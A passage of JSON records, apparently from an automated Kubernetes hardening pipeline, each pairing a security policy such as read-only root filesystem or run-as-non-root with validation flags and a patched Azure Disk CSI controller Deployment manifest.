    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01146",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01147",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01148",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01149",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n            cpu: 500m\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          